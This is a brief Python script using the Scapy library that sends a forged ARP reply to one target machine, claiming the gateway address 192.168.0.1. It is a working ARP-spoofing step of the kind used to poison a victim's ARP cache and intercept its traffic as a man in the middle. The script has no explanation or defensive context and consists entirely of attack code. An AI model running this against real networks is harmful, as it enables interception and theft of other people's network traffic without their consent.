from scapy.all import *

target_mac = "bc:5f:f4:d0:85:9f"
switch_ip = "192.168.0.1"

sendp(Ether(dst=target_mac)/ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", psrc=switch_ip))
